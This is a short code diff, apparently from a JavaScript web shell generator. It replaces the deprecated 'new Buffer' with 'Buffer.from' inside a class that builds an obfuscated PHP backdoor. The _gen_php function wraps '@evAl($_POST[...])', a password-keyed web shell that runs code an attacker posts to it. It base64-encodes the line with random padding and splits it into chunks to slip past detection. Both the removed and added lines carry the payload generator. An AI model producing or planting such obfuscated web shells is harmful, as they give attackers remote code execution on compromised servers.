@@ -24,7 +24,7 @@ class Core {
   _gen_php(pwd){
     let self = this;
     let rnd = self._randint(1,1000000);
-    let cmd = new Buffer(`${rnd};@evAl($_POST[${pwd}]);${rnd*3};`).toString('base64');
+    let cmd = Buffer.from(`${rnd};@evAl($_POST[${pwd}]);${rnd*3};`).toString('base64');
     let sli = [];
     for(var i=0; i < cmd.length/5 + 1; i++){
       sli.push(cmd.slice(i*5,i*5+5));
@@ -66,7 +66,7 @@ class Core {
     case 0:
       return `'${c}'`;
     case 1:
-      return `base64_decode('${new Buffer(c).toString('base64')}')`;
+      return `base64_decode('${Buffer.from(c).toString('base64')}')`;
     case 2:
       var n = self._randint(200,1000);
       switch(n%3){
